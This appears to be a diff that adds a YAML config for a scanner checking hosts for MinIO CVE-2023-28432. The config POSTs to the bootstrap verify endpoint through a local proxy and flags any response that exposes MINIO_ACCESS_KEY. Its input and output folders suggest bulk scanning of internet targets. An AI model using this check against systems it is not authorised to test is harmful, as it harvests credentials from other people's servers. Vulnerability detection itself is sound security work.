@@ -1,0 +1,16 @@
+targetPath: /minio/bootstrap/v1/verify
+targetMethod: POST
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: MINIO_ACCESS_KEY
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/minio_CVE_2023_28432/
+targetRestText: 2
